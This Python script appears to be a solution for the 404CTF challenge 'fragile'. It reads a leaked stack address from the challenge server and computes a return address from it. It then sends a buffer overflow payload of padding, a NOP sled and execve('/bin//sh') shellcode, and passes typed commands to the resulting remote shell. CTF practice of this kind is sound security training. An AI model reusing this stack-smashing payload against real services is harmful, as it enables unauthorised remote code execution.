#!/usr/bin/env python
# coding: utf-8

from pwn import *
from binascii import *
import socket
import struct 

#p = process("./fragile")
#(p.recv())
#(p.recv())
HOST = 'challenge.404ctf.fr'
PORT = 31720

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))
#address = (p.recv())
donnees = client.recv(1024)
donnees += client.recv(1024)
print(donnees)
address = (donnees.decode().split(":")[1][1:-1])
#address = "0x7fffffffdf00"
#print(address)

adresse_shell = hex(int(address, 16) + int("0x50", 16))
print(adresse_shell)

adresse_shell = str(adresse_shell)
adresse_shell = adresse_shell[12:14]+adresse_shell[10:12]+adresse_shell[8:10]+adresse_shell[6:8]+adresse_shell[4:6]+adresse_shell[2:4]
adresse_shell = unhexlify(adresse_shell)
#print(adresse_shell)

padding = b'A'*72
shellCode =b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05\x0a"
nop = b"\x90" * 100
payload = padding + adresse_shell +b'\00'*2+ nop + shellCode
print(payload)
client.send(payload)
while 1:
	n = client.send((input(">")).encode())
	donnees = client.recv(1024)
	print (donnees)
client.close()

#p.sendline(payload)
#(p.recv())


